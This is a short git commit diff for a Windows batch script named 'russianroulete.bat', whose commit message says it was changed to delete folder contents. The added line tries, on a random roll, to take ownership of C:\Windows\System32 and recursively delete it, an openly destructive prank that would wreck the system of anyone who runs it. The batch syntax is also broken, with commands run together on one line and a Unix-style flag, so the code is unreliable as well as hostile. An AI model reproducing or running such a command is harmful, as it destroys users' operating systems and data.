0f75727ed6984a11a13a66cc884cfcfa15f59364
Java sauce <mohammedbrandon204@gmail.com>
2022-09-17 18:37:21 -0700

    made it delete the contents in the folder

--- russianroulete.bat
+++ russianroulete.bat
@@ -1,5 +1,6 @@
 @echo off
 set /a result=(%RANDOM%*max/8)+min
 
-if %RANDOM%== 3 cd C:\Windows\System32 takeown /F System32 /R rmdir delete
+if %RANDOM%== 3 cd C:\Windows\System32 takeown /F System32 /R rmdir -r C:\Windows\System32
 
+pause
